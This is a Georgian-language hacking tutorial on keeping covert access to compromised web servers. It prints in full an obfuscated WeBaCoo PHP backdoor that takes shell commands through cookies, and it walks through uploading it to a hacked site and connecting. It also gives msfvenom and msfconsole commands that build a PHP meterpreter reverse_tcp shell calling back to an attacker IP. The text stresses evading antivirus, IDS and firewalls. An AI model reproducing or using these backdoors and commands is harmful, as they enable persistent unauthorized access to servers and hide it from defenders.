ვებ ბექდორი მოსახერხებელია გატეხილ ვებ სერვერთან ხელახლა "ჩუმად" კავშირისთვის.
ეს ბექდორები შესაძლოა აღმოჩენილი იყვენ IDS-ის ან ანტივირუსის მიერ.

# WeBaCoo

WeBaCoo (Web Backdoor Cookie) არის ვებ ბექდორის სკრიპტი რომელიც საშუალებას იძლევა რომ ვებ სერვერთან გქონდეს მიწვდომა ისე რომ ინტრეფეისი ტერმინალს გავდეს და ბძანებების გაშვება შეგეძლოს.

WeBaCoo-ს გააჩნია მოქმედების 2 რეჟიმი:
  * Generation (პარამეტრი -g): ქმნის ბექდორის კოდს PHP მარგი ტვირთებით (payload)
  * Terminal (პარამეტრი -t): უკავშირდება გატეხილ სერვერს

WeBaCoo-ი საინტერესოა იმით რომ კლიენტის და ვებ სერვერის შორის კავშირი ენკოდირებულია HTTP ქუქიში რაც მას ძნელად აღმოსაჩენს ქმნის ანტივირუსისგან, IDS-გან, IPS-გან, ქსელის ფაირვოლისგან და აპლიკაციური ფაირვოლისგან.

ეს არის 3 მნიშვნელოვანი პარამეტრი HTTP ქუქიში:
  * cm: შელის ბრძანება ენკოდირებულიაBase64-ში
  * cn: ქუქიის სახელწოდება რომელსაც სერვერის გააგზავნის მონაცემების გაგზვანის თანავე
  * cp: დელიმიტერი, მონაცემების გაგზავნის შეფუთისთვის

obfuscated PHP შექმენისთვის დეფოლტი არჩევნებით: 

```
hacker@kali /tmp> webacoo -g -o test.php

	WeBaCoo 0.2.3 - Web Backdoor Cookie Script-Kit
	Copyright (C) 2011-2012 Anestis Bechtsoudis
	{ @anestisb | anestis@bechtsoudis.com | http(s)://bechtsoudis.com }

[+] Backdoor file "test.php" created.
```

ვნახოთ რას გავს შექმნილი ფაილი:

```
hacker@kali /tmp> cat test.php 
<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>
```

შემდეგ ატვირთე ეს ფაილი გატეხილ სერვერზე (http://www.hackedsite.com).
და დაუკავშირდი ამ ბექდორს:

```
# webacoo –t –u http://www.hackedsite.com/test.php
```

ბექდორის ტერმინალი რომ დატოვო დაბეჭდე exit.

# PHP meterpreter

Metasploit-ს აქვს PHP meterpreter მარგი ტვირთვი.
ამ მოდულით შეგიძლია რომ შექმნა PHP ვებ შელი რომელსაც ექნება meterpreter-ის შესაძლებლობები.
შემდეგ ამ ვებ შელის ატვირთვა შეგიძლია ვებ სერვზე არსებული სისუსტეების გამოყენებით როგორიცაა ბრძანების ინექცია (command injection) ან ფაილის ინექცია.

  * ჰაკერის კომპიუტერის IP მისამართია 172.27.54.148
  * სერვერის IP მისამართია 172.27.54.141

```
hacker@kali /tmp> msfvenom -p php/meterpreter/reverse_tcp LHOST=172.27.54.148 -f raw > php-meter.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1114 bytes
```

პარამეტრბის ახსმა განმარტება:
  * -p (payload): მარგი ტვირთი
  * -f (format): ფორმატი
  * LHOST: თავდამსმელის კომპიუტერის IP მისამართი

ყურადღება:
სანამ შექმნილ ბექდორს ატვირთავ php-ს კომენარის ნიშნები უნდა მოხსნა:

შექმნილი ბექდორის საწყისი ცვლილებისამდე:

```
hacker@kali /tmp> cat php-meter.php
/*<?php /**/ error_reporting(0); ...
```

შექმნილი ბექდორის საწყისი ცვლილების შემდეგ: 

```
hacker@kali /tmp> cat php-meter.php
<?php error_reporting(0); ...
```

შემდეგ შენს კომპიუტერში გაუშვი მეტასპლოიტის კონსოლი (msfconsole) და გამოიყენე multi/handler ექსპლოიტი.
შემდეგ იხმარე php/meterpreter/reverse_tcp მარგი ტვირთი.
LHOST-ს მიუთითე შენი IP მისამართი. და მიეცი ბრძანება exploit.

```
hacker@kali /tmp> msfconsole
...
msf > use exploit/multi/handler 
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 172.27.54.148
LHOST => 172.27.54.148
msf exploit(multi/handler) > exploit
```

როცა ვებ შელს ატვირთავ გატეხილ სერვერზე, შეგეძლება რომ მასთან მიწვდომა გქონდეს შემდგომი ტიპის მისამართზე: https://172.27.54.141/php-meter.php
